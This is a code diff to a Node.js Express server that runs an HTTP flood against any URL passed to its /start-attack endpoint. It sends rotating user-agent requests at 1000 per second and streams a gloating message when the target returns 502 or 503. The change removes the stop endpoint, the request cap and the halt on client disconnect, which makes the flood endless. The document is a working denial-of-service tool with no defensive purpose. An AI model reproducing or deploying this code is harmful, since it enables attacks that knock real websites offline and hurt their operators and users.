@@ -17,8 +17,6 @@ const userAgents = [
     'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413'
 ];
 
-let continueAttack = false;
-
 app.use(express.static('public'));
 
 app.get('/', (req, res) => {
@@ -26,16 +24,10 @@ app.get('/', (req, res) => {
 });
 
 app.get('/start-attack', (req, res) => {
-    if (continueAttack) {
-        res.status(400).send('Attack is already running.');
-        return;
-    }
-
     const url = req.query.url;
-    continueAttack = true;
+    let isWebsiteDown = false;
 
-    const maxRequests = 5000000000;
-    const requestsPerSecond = 10000;
+    const requestsPerSecond = 1000; // Adjust this value if needed
 
     res.writeHead(200, {
         'Content-Type': 'text/event-stream',
@@ -45,50 +37,39 @@ app.get('/start-attack', (req, res) => {
     });
 
     const attack = () => {
-        if (!continueAttack) return;
-
         const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
         const headers = { 'User-Agent': userAgent };
 
         axios.get(url, { headers })
             .then((response) => {
-                if (response.status === 503) {
+                if ((response.status === 503 || response.status === 502) && !isWebsiteDown) {
                     res.write('data: BOOM BAGSAK ANG GAGO HAHAHA 🤣🤣\n\n');
-                    continueAttack = false; // Stop the attack
-                } else {
-                    res.write(`data: Status Code: ${response.status}\n\n`);
+                    isWebsiteDown = true;
+                } else if ((response.status !== 503 && response.status !== 502) && isWebsiteDown) {
+                    res.write(`data: Website is back up with Status Code: ${response.status}\n\n`);
+                    isWebsiteDown = false;
                 }
             })
             .catch((error) => {
-                if (error.response && error.response.status === 502) {
-                    res.write('data: Error: Request failed with status code 502\n\n');
+                if (error.response && (error.response.status === 502 || error.response.status === 503) && !isWebsiteDown) {
+                    res.write('data: BOOM BAGSAK ANG GAGO HAHAHA 🤣🤣\n\n');
+                    isWebsiteDown = true;
+                } else if (error.response && (error.response.status !== 502 && error.response.status !== 503) && isWebsiteDown) {
+                    res.write(`data: Website is back up with Status Code: ${error.response.status}\n\n`);
+                    isWebsiteDown = false;
                 } else {
                     res.write(`data: Error: ${error.message}\n\n`);
                 }
             });
 
-        if (continueAttack) {
-            setTimeout(attack, 1000 / requestsPerSecond);
-        } else {
-            res.end();
-        }
+        setTimeout(attack, 1000 / requestsPerSecond);
     };
 
     attack();
 
-    setTimeout(() => {
-        continueAttack = false;
-        res.end();
-    }, maxRequests / requestsPerSecond * 1000);
-
     req.on('close', () => {
-        continueAttack = false;
+        console.log('Connection closed by client');
     });
-});
-
-app.get('/stop-attack', (req, res) => {
-    continueAttack = false;
-    res.json({ message: 'Attack stopped.' });
 });
 
 const PORT = process.env.PORT || 3000;
